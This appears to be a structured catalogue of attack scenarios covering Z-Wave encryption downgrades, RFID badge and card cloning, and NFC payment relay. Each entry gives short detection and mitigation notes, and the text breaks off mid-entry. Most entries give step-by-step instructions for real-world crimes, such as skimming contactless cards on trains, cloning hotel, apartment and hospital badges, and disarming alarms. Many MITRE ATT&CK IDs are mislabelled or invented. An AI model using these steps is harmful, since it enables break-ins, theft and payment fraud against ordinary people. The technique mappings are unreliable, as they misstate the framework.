- **Attack Type**: Z-Wave Downgrade Attack
- **Target**: Z-Wave Alarm System
- **Vulnerability**: S2 fallback to S0 allows key theft
- **MITRE**: T1557: Adversary-in-the-Middle
- **Impact**: Alarm can be disarmed remotely
- **Tools**: UZB Sniffer, PC Controller, Wireshark
- **Scenario**: An attacker forces a Z-Wave-enabled alarm system to fall back from S2 encryption to S0, allowing them to issue unauthorized commands such as disabling the alarm.
- **Attack Steps**: Step 1: Identify the Z-Wave alarm panel and ensure it is powered on and discoverable.Step 2: Wait until the device is unpaired or reset (or socially engineer a reset event).Step 3: Plug in the UZB stick and start Wireshark to capture Z-Wave traffic.Step 4: Initiate a pairing attempt using the PC Controller, but advertise only support for S0 (omit S2).Step 5: The alarm panel attempts S2, but upon receiving no response or an invalid S2 frame, falls back to S0.Step 6: During S0 pairing, the alarm panel sends the encryption key in plaintext.Step 7: Capture this key from the Wireshark logs.Step 8: Use PC Controller with the captured key to send a “DISARM” command to the alarm system.Step 9: Confirm the alarm has been disabled.Step 10: Log the activity and simulate response procedures in a lab setup.
- **Detection**: Unusual pairing followed by control command
- **Solution**: Enforce mandatory S2 encryption on alarms
- **Tags**: z-wave, alarm, s0 fallback, disarm

## Downgrade Attack via Controller Firmware Exploit

- **Attack Type**: Z-Wave Downgrade Attack
- **Target**: Z-Wave Controller + Device
- **Vulnerability**: Legacy controller enforces downgrade
- **MITRE**: T1609: Container or OS Exploitation
- **Impact**: Even modern S2 devices become vulnerable
- **Tools**: UZB Sniffer, Legacy Controller (old firmware), Wireshark
- **Scenario**: A Z-Wave controller with outdated firmware can be tricked into performing insecure S0-only pairing even with S2 devices.
- **Attack Steps**: Step 1: Acquire a Z-Wave controller running legacy firmware (pre-2017).Step 2: Connect the controller to a PC and use official PC Controller software to manage pairing.Step 3: Begin pairing a modern S2 device (like a smart lock).Step 4: The outdated controller does not initiate S2 negotiation and only offers S0.Step 5: The modern device, due to protocol specifications, falls back to S0 in order to complete pairing.Step 6: Sniff the pairing process using Wireshark.Step 7: Capture the S0 network key as it is transmitted in plaintext.Step 8: After successful pairing, demonstrate the ability to send legitimate control commands using the captured key.Step 9: Show how outdated controllers can act as an entry point for attacks on newer devices.Step 10: Use the scenario to educate students on lifecycle management of IoT firmware.
- **Detection**: Alert on pairing with outdated controllers
- **Solution**: Block known vulnerable controller firmware hashes
- **Tags**: firmware, downgrade, controller exploit

## Z-Wave Mesh Routing Abuse via Downgrade

- **Attack Type**: Z-Wave Downgrade Attack
- **Target**: Z-Wave Routing Node
- **Vulnerability**: S0 downgrade enables route takeover
- **MITRE**: T1020: Automated Exfiltration (via mesh path)
- **Impact**: Attacker can intercept and alter routed data
- **Tools**: Z-Wave Toolbox, Mesh Visualizer, PC Controller
- **Scenario**: Attacker gains access to a routing node using a downgrade attack and reroutes mesh traffic through their rogue node.
- **Attack Steps**: Step 1: Identify a routing node in the mesh (e.g., Z-Wave range extender or smart plug).Step 2: Reset the routing node and prepare to re-pair it using attacker’s S0-only controller.Step 3: Start PC Controller and advertise only S0 during pairing.Step 4: The routing device accepts S0 and sends key in the clear.Step 5: Use the Z-Wave mesh mapping tool to view the route changes after re-integration.Step 6: Observe that Z-Wave messages from other devices are now relayed through the rogue-controlled node.Step 7: Use this access to log or modify relayed commands (like door locks or motion alerts).Step 8: Demonstrate man-in-the-middle data tampering in a simulated mesh environment.Step 9: Show how a single compromised node affects the entire mesh.Step 10: Discuss how mesh topology awareness is critical in IoT security.
- **Detection**: Monitor mesh routes for unexpected relays
- **Solution**: Secure routing devices with S2-only and route monitoring
- **Tags**: z-wave, mesh, route hijack

## Downgrade Attack Combined with Physical Tamper

- **Attack Type**: Z-Wave Downgrade Attack
- **Target**: Z-Wave Field Devices
- **Vulnerability**: Physical tamper forces insecure re-pairing
- **MITRE**: T1190: Exploit Public-Facing Application (modified for IoT physical access)
- **Impact**: Unauthorized reprogramming of IoT devices
- **Tools**: Z-Wave Stick, PC Controller, Tamper Tools (screwdriver)
- **Scenario**: The attacker physically tampers with a Z-Wave device to force a reset, then uses downgrade during re-pairing to gain control.
- **Attack Steps**: Step 1: Physically locate a target device (e.g., smart lock or thermostat).Step 2: Unscrew or open the casing to trigger a hardware reset or use the physical reset button.Step 3: Device goes into pairing mode expecting secure controller.Step 4: Start pairing using attacker-controlled S0-only controller.Step 5: Since no S2 handshake occurs, device downgrades to S0.Step 6: The key is sent in clear and captured using sniffer.Step 7: Now pair device fully to rogue controller.Step 8: Use controller to send malicious commands (e.g., turn off heat, unlock door).Step 9: Repeat for multiple field devices in simulation lab to show how physical access leads to Z-Wave compromise.Step 10: Discuss tamper resistance and S2 enforcement in hardware design.
- **Detection**: Alert on unregistered pairing after reset
- **Solution**: Use tamper-evident cases; restrict resets
- **Tags**: tamper, physical, z-wave, downgrade

## Fake S2 Support Advertisement to Force Downgrade

- **Attack Type**: Z-Wave Downgrade Attack
- **Target**: Any S2-Capable Device
- **Vulnerability**: Silent failback from fake S2 negotiation
- **MITRE**: T1631: Downgrade Attack
- **Impact**: Downgrade enables man-in-the-middle control
- **Tools**: PC Controller, Wireshark, S2 Fake Library
- **Scenario**: Attacker pretends to support S2, but during handshake silently fails and causes device to use S0.
- **Attack Steps**: Step 1: Build or configure a PC Controller that pretends to support S2 during inclusion process.Step 2: Initiate pairing with an S2-capable device.Step 3: Respond positively to initial S2 negotiation frames.Step 4: During encryption key exchange, send no response or invalid payload.Step 5: Device assumes S2 is not supported after timeout.Step 6: Device restarts pairing and offers S0.Step 7: Accept S0 pairing and capture the cleartext key.Step 8: Use this key to impersonate controller and issue commands.Step 9: Demonstrate in lab how spoofed S2 support results in downgrade.Step 10: Emphasize importance of retry-on-failure enforcement for S2-only configurations.
- **Detection**: Track repeated S2 negotiation failures
- **Solution**: Require S2-exclusive pairing policies
- **Tags**: z-wave, spoof, s2 failover

## Hotel Room Key Cloning via RFID

- **Attack Type**: RFID Tag Cloning
- **Target**: Hotel Room RFID Locks
- **Vulnerability**: Unencrypted RFID data on keycard
- **MITRE**: T1078.001 - Valid Accounts: Default Accounts
- **Impact**: Unauthorized physical access
- **Tools**: Proxmark3, blank RFID cards, RFID card reader
- **Scenario**: Attacker clones a hotel keycard to gain unauthorized room access.
- **Attack Steps**: Step 1: Attacker books a room in a hotel using RFID keycards.Step 2: Attacker taps the RFID card to a concealed reader (Proxmark3 in backpack or jacket) to scan and save card data.Step 3: Attacker returns to their room and uses software to write the captured data to a blank RFID tag.Step 4: Cloned card is tested and grants access to the original hotel room.Step 5: Attacker now has a duplicate key and can access the room at any time.
- **Detection**: RFID logging systems at doors
- **Solution**: Use encrypted RFID, rotate keys, detect duplicate IDs
- **Tags**: RFID, Hotel Key, Cloning, Access Control

## Office Access Card Duplication

- **Attack Type**: RFID Tag Cloning
- **Target**: Office Door RFID Access System
- **Vulnerability**: Weak RFID authentication, no logging
- **MITRE**: T1078.004 - Valid Accounts: Smart Cards
- **Impact**: Insider data theft, unauthorized presence
- **Tools**: RFID reader, blank cards, software (e.g., LF RFID Tool)
- **Scenario**: An employee's access badge is secretly cloned by a malicious insider to sneak in after hours.
- **Attack Steps**: Step 1: Insider invites employee to coffee, borrows their badge “as a joke.”Step 2: Uses portable reader to capture the card data quickly while concealed.Step 3: After returning the badge, they copy the captured data to a writable RFID card.Step 4: Uses cloned badge to enter the office during a holiday without detection.Step 5: Copies sensitive documents or installs spyware physically.
- **Detection**: Badge system audit logs
- **Solution**: Multi-factor access, encrypted RFID, physical card logs
- **Tags**: Office Security, Insider, RFID Cloning

## Library Book RFID Tag Cloning for Theft

- **Attack Type**: RFID Tag Cloning
- **Target**: Library RFID systems
- **Vulnerability**: Static RFID IDs, lack of tag validation
- **MITRE**: T1005 - Data from Local System
- **Impact**: Book theft without alarm triggering
- **Tools**: Proxmark3, cloned RFID book tags
- **Scenario**: A thief clones book RFID tags to bypass security gates and steal books.
- **Attack Steps**: Step 1: Thief enters a library and borrows a book normally to examine RFID tag data.Step 2: Uses Proxmark3 to clone the RFID tag onto a blank tag.Step 3: Attaches fake tag to another similar book they want to steal.Step 4: Walks out of the library with the altered book; security gates don't detect theft.Step 5: Returns original book undetected, keeps stolen one.
- **Detection**: Gate logs, mismatch between inventory and logs
- **Solution**: Use dynamic RFID tags, visual checks, tag audits
- **Tags**: RFID, Theft, Book Tag, Library

## NFC-Based Payment Card Cloning

- **Attack Type**: RFID Tag Cloning
- **Target**: Contactless Payment Cards
- **Vulnerability**: Lack of encryption or tap limits
- **MITRE**: T1006 - Data from Removable Media
- **Impact**: Financial loss through cloned card
- **Tools**: NFC reader app, Android phone with NFC, blank RFID card
- **Scenario**: Cloning contactless NFC payment card for unauthorized purchases.
- **Attack Steps**: Step 1: Attacker stands close to victim in a crowded train.Step 2: Uses NFC reader app on phone to scan victim's card through clothing (NFC skimming).Step 3: Extracts basic payment details and stores them.Step 4: Transfers data onto another NFC-compatible card using a phone.Step 5: Attempts small-value transactions at unattended kiosks or vending machines.
- **Detection**: Bank logs, unusual geo-location usage
- **Solution**: Use RFID-blocking wallets, transaction limits
- **Tags**: NFC, Card Skimming, Payment Fraud

## Access Tag Duplication in Co-working Spaces

- **Attack Type**: RFID Tag Cloning
- **Target**: RFID Doors in Shared Spaces
- **Vulnerability**: Passive tag broadcast without authentication
- **MITRE**: T1200 - Hardware Additions
- **Impact**: Privacy breach, infrastructure compromise
- **Tools**: RFID reader, card copier, blank tags
- **Scenario**: Hacker clones RFID tags from shared space members to access premium zones.
- **Attack Steps**: Step 1: Attacker visits a shared office and observes someone tapping RFID tag.Step 2: Walks behind them and discreetly scans the tag with handheld reader.Step 3: Goes to nearby area, writes the tag data to a blank tag.Step 4: Uses cloned tag to access premium zones like server rooms or meeting halls.Step 5: Uses physical access to steal data or tamper with devices.
- **Detection**: Access log comparison, motion CCTV
- **Solution**: Role-based access, RFID mutual auth, CCTV audit
- **Tags**: RFID Cloning, Shared Office, Physical Access

## Public Transport Card Cloning

- **Attack Type**: RFID Tag Cloning
- **Target**: Public Transport Smartcards
- **Vulnerability**: MIFARE Classic vulnerability, static keys
- **MITRE**: T1078 - Valid Accounts
- **Impact**: Free transit, revenue loss
- **Tools**: Android with NFC, MIFARE Classic Tool, blank NFC card
- **Scenario**: Attacker clones a subway pass to ride for free.
- **Attack Steps**: Step 1: Attacker spots someone tapping their subway card at an entry gate.Step 2: Uses Android phone with NFC to scan the card covertly in close proximity.Step 3: Saves the RFID dump using MIFARE Classic Tool.Step 4: Writes the data to a blank NFC card.Step 5: Tests cloned card at a subway gate; gains access without valid payment.Step 6: Uses it repeatedly for unauthorized free travel.
- **Detection**: Turnstile logs, repeated ID use alerts
- **Solution**: Upgrade to MIFARE DESFire EV2/EV3, session keys
- **Tags**: Transit Fraud, Cloning, MIFARE

## Gym Membership RFID Badge Cloning

- **Attack Type**: RFID Tag Cloning
- **Target**: Gym RFID Entry System
- **Vulnerability**: No encryption, static card data
- **MITRE**: T1005 - Data from Local System
- **Impact**: Unauthorized access, theft
- **Tools**: RFID copier, blank tag, concealed scanner
- **Scenario**: Attacker clones a gym member's badge to gain 24/7 access.
- **Attack Steps**: Step 1: Attacker stands near gym turnstile and sees member tap RFID badge.Step 2: Uses concealed RFID scanner to capture tag ID when close.Step 3: Goes to locker room, writes the ID to a blank tag.Step 4: Enters gym at night using cloned tag.Step 5: Uses facilities without paying, or steals items from unattended lockers.
- **Detection**: Entry logs and camera footage
- **Solution**: Biometric + RFID, time-based keys
- **Tags**: Gym, RFID Badge, Physical Access

## Parking Lot Access Cloning

- **Attack Type**: RFID Tag Cloning
- **Target**: Corporate Parking RFID Barrier
- **Vulnerability**: Lack of per-vehicle ID validation
- **MITRE**: T1078.004 - Smart Cards
- **Impact**: Parking abuse, security violations
- **Tools**: Proxmark3, RFID tag duplicator
- **Scenario**: Employee clones RFID parking tag to park extra unauthorized vehicles.
- **Attack Steps**: Step 1: Attacker borrows a friend’s employee parking card briefly.Step 2: Uses RFID copier to read and save the data.Step 3: Writes data to a new blank tag.Step 4: Attaches cloned tag to second car’s windshield.Step 5: Both vehicles gain access, violating parking limits.Step 6: Organization unaware due to no per-car tag validation.
- **Detection**: Camera mismatches, car logs
- **Solution**: License plate + RFID match system
- **Tags**: Parking Fraud, RFID, Tag Duplication

## Warehouse RFID Inventory Cloning

- **Attack Type**: RFID Tag Cloning
- **Target**: Warehouse Asset Tracking System
- **Vulnerability**: Static RFID, lack of physical checks
- **MITRE**: T1200 - Hardware Additions
- **Impact**: Asset theft masked by fake tags
- **Tools**: RFID reader, Proxmark3, writable tags
- **Scenario**: Insider duplicates RFID tags to fake asset inventory.
- **Attack Steps**: Step 1: Insider scans RFID tag on a high-value asset (e.g., laptop).Step 2: Writes same ID to several dummy tags.Step 3: Places cloned tags on empty boxes.Step 4: During audit, fake boxes are scanned as valid assets.Step 5: Real item is smuggled out, audit passes falsely.
- **Detection**: Visual inspection, tag density audit
- **Solution**: Add barcodes, GPS or tamper seals
- **Tags**: Inventory Fraud, RFID Spoof

## RFID Passport Data Clone

- **Attack Type**: RFID Tag Cloning
- **Target**: ePassports
- **Vulnerability**: Passive ePassport reading vulnerability
- **MITRE**: T1589 - Identity Theft
- **Impact**: ID theft, impersonation risk
- **Tools**: NFC-enabled phone, RF reader, ePassport toolkits
- **Scenario**: An attacker clones the RFID chip of an e-passport at a crowded checkpoint.
- **Attack Steps**: Step 1: Attacker uses phone with NFC and MRZ data (from passport visible page).Step 2: Approaches tourist at airport and starts reading passport chip.Step 3: Extracts RFID data from passport using open-source tools.Step 4: Stores identity data and clones to RFID emulator.Step 5: Uses fake RFID ID for ID fraud or PII theft.
- **Detection**: Border logs, unusual re-entries
- **Solution**: Shielded passport covers, chip shielding
- **Tags**: Passport RFID, NFC Clone

## Pet Microchip RFID Cloning

- **Attack Type**: RFID Tag Cloning
- **Target**: Pet Microchips
- **Vulnerability**: Static ID values, unauthenticated chips
- **MITRE**: T1589.003 - Personal Identifiers
- **Impact**: Pet theft, ID impersonation
- **Tools**: Animal RFID reader, chip writer, blank RFID tags
- **Scenario**: Attacker clones RFID chip of a pet for impersonation or theft.
- **Attack Steps**: Step 1: Attacker visits pet adoption center and scans RFID chip of a pet using a concealed reader.Step 2: Copies unique chip ID onto a blank pet tag.Step 3: Affixes tag to another animal or uses it to falsely claim ownership.Step 4: Uses cloned ID to file vet claim or register pet as their own.Step 5: Could exploit microchip-based pet door access.
- **Detection**: Vet registry mismatches
- **Solution**: Microchip ID authentication, photo registry
- **Tags**: Pet RFID, Cloning, Animal Theft

## Event Pass RFID Badge Cloning

- **Attack Type**: RFID Tag Cloning
- **Target**: Event Management RFID System
- **Vulnerability**: No access tier encryption
- **MITRE**: T1078 - Valid Accounts
- **Impact**: Event security breach, data exposure
- **Tools**: RFID scanner, card writer, blank tag
- **Scenario**: Unauthorized attendee clones an RFID event badge to access VIP areas.
- **Attack Steps**: Step 1: Attacker scans a VIP badge during lunch break.Step 2: Writes VIP data onto a blank RFID tag.Step 3: Attends general sessions in the morning.Step 4: Uses cloned badge in afternoon to access backstage or speaker-only zones.Step 5: Gains proximity to executives or steals giveaway items.
- **Detection**: Zone entry logs, physical inspection
- **Solution**: QR+RFID combo, staff verification
- **Tags**: Event Security, RFID Cloning

## Access Badge Cloning via Turnstile Tailgating

- **Attack Type**: RFID Tag Cloning
- **Target**: Corporate Office Access Cards
- **Vulnerability**: No badge access rate-limiting
- **MITRE**: T1200 - Hardware Additions
- **Impact**: Physical infrastructure compromise
- **Tools**: RFID reader in bag, USB duplicator, blank card
- **Scenario**: Cloning badge by tailgating and scanning with close-range reader.
- **Attack Steps**: Step 1: Attacker follows employee closely into a building (tailgating).Step 2: Uses bag-concealed reader to scan RFID badge mid-swipe.Step 3: Goes to restroom and clones the scanned data to a new card.Step 4: Waits until after-hours and uses the cloned card.Step 5: Installs a rogue device in the network room.
- **Detection**: Entry time anomaly detection
- **Solution**: Anti-tailgating sensors, badge tap logging
- **Tags**: RFID, Cloning, Tailgating

## Car Immobilizer RFID Clone

- **Attack Type**: RFID Tag Cloning
- **Target**: Car Immobilizer
- **Vulnerability**: No mutual authentication
- **MITRE**: T1647 - Pluggable Device
- **Impact**: Car theft with no forced entry
- **Tools**: Key fob reader, signal amplifier, RFID writer
- **Scenario**: Attacker clones the car’s RFID immobilizer to steal vehicle.
- **Attack Steps**: Step 1: Attacker uses RFID relay device to pick up signal from car key inside house.Step 2: Signal is captured and amplified.Step 3: Clones the immobilizer data to a new key fob.Step 4: Uses cloned fob to unlock and start car.Step 5: Drives off without alarm or key.
- **Detection**: Forensics of startup logs
- **Solution**: Faraday pouch, rolling code keys
- **Tags**: Vehicle RFID, Theft, Key Clone

## NFC Smart Poster Payload Cloning

- **Attack Type**: RFID Tag Cloning
- **Target**: NFC-enabled Smart Posters
- **Vulnerability**: Editable tag without authentication
- **MITRE**: T1566.002 - Spearphishing via Link
- **Impact**: Phishing, credential theft
- **Tools**: NFC reader/writer, blank NFC tags
- **Scenario**: Cloning NFC tag from a smart poster and redirecting to malicious link.
- **Attack Steps**: Step 1: Attacker visits public area with NFC-enabled poster (e.g., concert or train ad).Step 2: Reads original NFC tag containing URL.Step 3: Clones tag to new blank tag but alters link to phishing site.Step 4: Replaces original NFC tag on poster with malicious one.Step 5: Visitors who tap poster are redirected to attacker’s phishing site.
- **Detection**: URL mismatch alerting tools
- **Solution**: NFC tag write-locking, physical tag seals
- **Tags**: NFC, Phishing, Smart Poster

## Hospital Staff ID Badge Cloning

- **Attack Type**: RFID Tag Cloning
- **Target**: Hospital Staff Badge System
- **Vulnerability**: Static RFID ID, no encryption or second factor
- **MITRE**: T1078.004 - Valid Accounts: Smart Cards
- **Impact**: Physical intrusion, access to sensitive areas or medication
- **Tools**: RFID reader (Proxmark3), blank 125kHz tag, RFID software
- **Scenario**: Attacker clones a nurse's RFID badge to access restricted areas in a hospital.
- **Attack Steps**: Step 1: Attacker pretends to be a visitor and observes staff using badges.Step 2: They stand in a busy hallway and carry a small RFID scanner in a shoulder bag.Step 3: When a nurse walks by, the attacker positions the bag near the badge clipped to the nurse's coat.Step 4: The scanner picks up the badge’s unique identifier within seconds.Step 5: The attacker then returns to a private location and writes the captured ID to a blank tag using cloning software.Step 6: With the cloned badge, the attacker accesses medicine storage and staff-only areas without raising suspicion.
- **Detection**: Review of badge scan logs and staff shift records
- **Solution**: Encrypted badges, staff picture verification at doors
- **Tags**: Healthcare, Physical Intrusion, Badge Cloning

## College Exam Paper Room Entry via Cloned Tag

- **Attack Type**: RFID Tag Cloning
- **Target**: College RFID Access Control
- **Vulnerability**: Weak physical security validation, no surveillance redundancy
- **MITRE**: T1005 - Data from Local System
- **Impact**: Academic integrity violation, exam compromise
- **Tools**: Handheld RFID reader, card writer, blank tag
- **Scenario**: Student clones RFID of exam coordinator to gain access to exam papers before the test.
- **Attack Steps**: Step 1: The student observes the exam coordinator scanning their card on the office door.Step 2: During a meeting, the student walks by the coordinator and uses a concealed RFID reader to capture the tag.Step 3: They later write the captured ID to a blank RFID tag at home.Step 4: At night, the student enters the building with the cloned tag and accesses the exam storage room.Step 5: They take pictures of upcoming question papers, then leave without physical signs of entry.Step 6: The original tag holder remains unaware, as RFID logs only show normal entry.
- **Detection**: Manual log review, CCTV mismatch analysis
- **Solution**: Multi-factor ID + manual verification for high-risk zones
- **Tags**: RFID, Exam Theft, Academic Threat

## Construction Site Access Tag Duplication

- **Attack Type**: RFID Tag Cloning
- **Target**: Construction Site RFID Badge System
- **Vulnerability**: No biometric or personal validation
- **MITRE**: T1589.003 - Personal Identifiers
- **Impact**: Safety violations, insurance & legal issues
- **Tools**: RFID copier, blank cards
- **Scenario**: Unauthorized worker clones a contractor’s access badge to work without safety training.
- **Attack Steps**: Step 1: Unauthorized laborer sees a certified contractor leave their badge on a break table.Step 2: The attacker quickly uses a portable RFID copier to scan the badge and save the ID.Step 3: They write the ID onto a blank tag using the cloning device.Step 4: Uses the new tag to enter hazardous work zones on-site where safety training is mandatory.Step 5: Works on equipment illegally, risking injury and insurance fraud.Step 6: If an accident occurs, the cloned tag ID misattributes the incident to the original badge holder.
- **Detection**: Unusual entry time correlation, badge audits
- **Solution**: Add biometric checks and real-time staff verification
- **Tags**: RFID, Safety Breach, Badge Clone

## RFID Tag Cloning in Apartment Complexes

- **Attack Type**: RFID Tag Cloning
- **Target**: Apartment Entry Keyfobs
- **Vulnerability**: No rolling codes or tamper checks
- **MITRE**: T1647 - Pluggable Device
- **Impact**: Home burglary, resident safety risk
- **Tools**: RFID reader in phone case, blank keyfob
- **Scenario**: Attacker clones access tag from a resident to break into residential towers.
- **Attack Steps**: Step 1: Attacker acts as a delivery person and observes residents using RFID keyfobs to open gates.Step 2: They stand nearby and use a disguised RFID reader built into a phone case.Step 3: When close to a resident, they scan the tag ID in seconds.Step 4: In their car, they clone the data onto a blank fob using a keyfob writer.Step 5: Later, they return at night and use the cloned tag to enter through the parking gate and stairwell.Step 6: They attempt break-ins or theft without detection.
- **Detection**: Entry log timestamps vs resident claims
- **Solution**: Use BLE-based keys or smartphone-based entry
- **Tags**: RFID, Residential Access, Intrusion

## NFC-Enabled Loyalty Card Cloning

- **Attack Type**: RFID Tag Cloning
- **Target**: Retail NFC Loyalty System
- **Vulnerability**: No verification of purchase origin or device
- **MITRE**: T1566.002 - Spearphishing via Link
- **Impact**: Reward fraud, reputational harm to customer
- **Tools**: Android phone with NFC, blank NFC stickers
- **Scenario**: An attacker clones loyalty cards with embedded NFC to gain reward points fraudulently.
- **Attack Steps**: Step 1: Attacker shops at a mall where customers scan NFC loyalty cards to earn reward points.Step 2: They ask to “borrow” a friend’s card to try it, then scan it using their phone’s NFC reader.Step 3: Saves tag data and writes it to multiple blank NFC stickers.Step 4: Uses these stickers at different stores to claim purchases, earn points, and redeem rewards.Step 5: The system believes all purchases come from the real cardholder.Step 6: The original user loses reward points or faces blacklisting when fraud is suspected.
- **Detection**: Unusual usage pattern monitoring
- **Solution**: PIN-based verification on redemption
- **Tags**: NFC Cloning, Loyalty Fraud

## Basic NFC Relay with 2 Phones

- **Attack Type**: NFC Relay Attack
- **Target**: Smartphone, POS Terminal
- **Vulnerability**: Lack of user authentication or transaction PIN
- **MITRE**: T1647 (Data Staged: Payloads)
- **Impact**: Unauthorized transaction
- **Tools**: 2 NFC-enabled Android Phones, NFC Relay App (e.g., NFCProxy, NFCTools)
- **Scenario**: An attacker relays NFC communication from a victim’s phone to a point-of-sale terminal using two Android phones with NFC support.
- **Attack Steps**: Step 1: Attacker installs NFC relay app on both Android phones. Step 2: One phone is placed near the victim’s phone or NFC card to act as a reader. Step 3: Second phone is near the POS terminal to act as the card emulator. Step 4: The first phone reads NFC data and sends it via Wi-Fi/Internet to the second phone in real time. Step 5: The second phone sends the relayed data to the POS terminal, completing a fraudulent payment.
- **Detection**: POS log mismatch, payment verification alerts
- **Solution**: Use transaction PIN, secure elements, distance limits
- **Tags**: NFC, Android, POS, Relay Attack, Card Fraud

## Smartcard Payment Relay via Raspberry Pi

- **Attack Type**: NFC Relay Attack
- **Target**: NFC Smartcards
- **Vulnerability**: No transaction time validation, physical proximity not enforced
- **MITRE**: T1021.001 (Remote Services: Remote Desktop Protocol)
- **Impact**: Card cloning, monetary loss
- **Tools**: Raspberry Pi, PN532 NFC Reader, NFC Emulator, Relay Script (Python)
- **Scenario**: Attacker uses Raspberry Pi with NFC reader to capture and relay a smartcard's payment data to an emulator.
- **Attack Steps**: Step 1: Configure Raspberry Pi with PN532 reader using I2C or SPI mode. Step 2: Use Python scripts to capture NFC data from a payment card. Step 3: Transmit this data via LAN or Wi-Fi to a second Raspberry Pi or emulator device. Step 4: The second device emulates the NFC card at a POS terminal. Step 5: Successful transaction occurs while the real card is in attacker’s possession remotely.
- **Detection**: Transaction delay detection, geolocation mismatch
- **Solution**: Use Secure Element chips, enable proximity/time checks
- **Tags**: Raspberry Pi, NFC, Smartcard, Relay, Fraud

## NFC Relay via Bluetooth Link

- **Attack Type**: NFC Relay Attack
- **Target**: Contactless Cards
- **Vulnerability**: Weak proximity checks in POS system
- **MITRE**: T1071.001 (Application Layer Protocol: Web Protocols)
- **Impact**: Stealthy payment bypass
- **Tools**: Android Phone, Bluetooth Module, NFC Tools App
- **Scenario**: A relay is performed using a Bluetooth tunnel between an NFC reader and an emulator device to avoid physical wires.
- **Attack Steps**: Step 1: Install NFC reader app on Phone A, and NFC emulator on Phone B. Step 2: Pair both devices over Bluetooth. Step 3: Phone A is placed close to victim’s NFC card, acting as the reader. Step 4: Phone B is near the payment terminal and emulates the victim's card. Step 5: Data read by Phone A is sent over Bluetooth to Phone B in real-time. Step 6: POS terminal accepts the payment using relayed credentials.
- **Detection**: Bluetooth traffic monitoring, behavioral analysis
- **Solution**: Enforce time-of-flight and tap-to-PIN requirements
- **Tags**: Bluetooth, NFC, Relay, Contactless, Android

## NFC-enabled Hotel Card Relay

- **Attack Type**: NFC Relay Attack
- **Target**: Hotel Room Locks
- **Vulnerability**: NFC key reuse, no challenge-response
- **MITRE**: T1557.002 (Adversary-in-the-Middle: ARP Cache Poisoning)
- **Impact**: Physical access, room theft
- **Tools**: NFC Reader (Proxmark3), NFC Emulator, Wi-Fi Modules
- **Scenario**: Attacker relays access card signals from a hotel guest’s NFC-based keycard to open room doors remotely.
- **Attack Steps**: Step 1: Attacker places NFC reader near a guest's card in their bag or pocket while standing close in elevator. Step 2: NFC data is captured by a hidden device (e.g., backpack with reader + Raspberry Pi). Step 3: Captured signal is sent via Wi-Fi to another device near the guest room door. Step 4: Emulator device near door sends relayed NFC signal to unlock it. Step 5: Attacker accesses room without physical keycard.
- **Detection**: Door access logs, access time mismatch
- **Solution**: Use rotating keys, challenge-response authentication
- **Tags**: Hotel, NFC Keycard, Relay, Physical Security

## Google Pay Relay via Wearable

- **Attack Type**: NFC Relay Attack
- **Target**: Mobile Wallet (e.g., Google Pay)
- **Vulnerability**: Tap-to-pay token leakage, no device authentication
- **MITRE**: T1001 (Data Obfuscation)
- **Impact**: Unauthorized mobile wallet transaction
- **Tools**: Smartwatch with NFC, Android Phone, Custom Relay App
- **Scenario**: An attacker uses a smart watch to relay payment data to a payment terminal impersonating the victim’s phone.
- **Attack Steps**: Step 1: Attacker wears NFC-enabled smartwatch with hidden NFC relay code. Step 2: While near the victim, attacker’s phone connects via Wi-Fi Direct to the watch. Step 3: Watch reads payment token from victim's unlocked phone or nearby NFC tag. Step 4: Relay code sends token to attacker's phone, which forwards it to a terminal. Step 5: POS completes transaction using the relayed token.
- **Detection**: Wallet app logs, payment pattern anomaly
- **Solution**: Enforce biometric/PIN for every transaction
- **Tags**: Smartwatch, NFC Relay, Mobile Wallet, Token Hijack

## NFC Transport Pass Relay

- **Attack Type**: NFC Relay Attack
- **Target**: Transport Cards
- **Vulnerability**: No location/time checks in NFC systems
- **MITRE**: T1557 (Adversary-in-the-Middle)
- **Impact**: Unauthorized access to transit
- **Tools**: Android Phone, NFC Tools, Bluetooth/Wi-Fi Tunnel
- **Scenario**: A transit card is cloned via NFC relay while the victim waits at a station, enabling free access to buses or trains.
- **Attack Steps**: Step 1: Attacker uses an NFC reader phone and places it close to a commuter's bag or wallet. Step 2: Data from the NFC transport card is read silently. Step 3: Phone relays this data via Wi-Fi to a second device at a station gate. Step 4: Second device emulates the card and taps on the NFC gate. Step 5: Gate opens, thinking the real card is present.
- **Detection**: Ticketing system logs, card use at multiple locations
- **Solution**: Use dynamic keys or ticket validation
- **Tags**: NFC, Transport Card, Relay Fraud

## NFC Banking App Relay via Hidden Emulator

- **Attack Type**: NFC Relay Attack
- **Target**: NFC-enabled Phone
- **Vulnerability**: Tap-to-pay token replay risk
- **MITRE**: T1647 (Data Staged)
- **Impact**: Financial theft
- **Tools**: Android Phone, Relay App, Rooted Emulator
- **Scenario**: Banking app token is relayed in real-time from a victim’s phone to an emulator to process fraudulent contactless payments.
- **Attack Steps**: Step 1: Victim opens banking app with NFC payment enabled. Step 2: Attacker’s phone scans NFC field from a close distance (e.g., in a crowded metro). Step 3: Relay software sends real-time data to a rooted emulator on a laptop. Step 4: Emulator uses the token to initiate a tap-to-pay transaction. Step 5: Transaction is completed without victim noticing.
- **Detection**: App logs vs real user behavior
- **Solution**: Use biometric auth for every tap
- **Tags**: Banking, NFC, Token Relay

## NFC Door Access Badge Relay using Drones

- **Attack Type**: NFC Relay Attack
- **Target**: Office Door Locks
- **Vulnerability**: Long-range relay via wireless devices
- **MITRE**: T1021 (Remote Services)
- **Impact**: Unauthorized physical access
- **Tools**: 2 Android Phones, Drone, Relay App, NFC Reader
- **Scenario**: Drone carries an NFC emulator near a secure access door while attacker relays badge data from afar.
- **Attack Steps**: Step 1: Attacker places phone with NFC reader near the victim's access badge in bag. Step 2: Drone hovers near access door with second phone/emulator. Step 3: NFC data is captured and sent wirelessly to the emulator on the drone. Step 4: Emulator sends relay signal to unlock the door. Step 5: Door opens for attacker without physical presence.
- **Detection**: Access time vs location mismatch
- **Solution**: Use distance bounding & presence check
- **Tags**: Drone, Physical Access, Door Relay

## Passive NFC Relay via Card Skimmer

- **Attack Type**: NFC Relay Attack
- **Target**: Contactless Payment Cards
- **Vulnerability**: Proximity authentication bypass
- **MITRE**: T1557.001 (Adversary-in-the-Middle)
- **Impact**: Credit card fraud, skimming
- **Tools**: NFC Skimmer, Raspberry Pi, Remote Emulator
- **Scenario**: An attacker installs a passive NFC reader under a café table to skim and relay NFC card data.
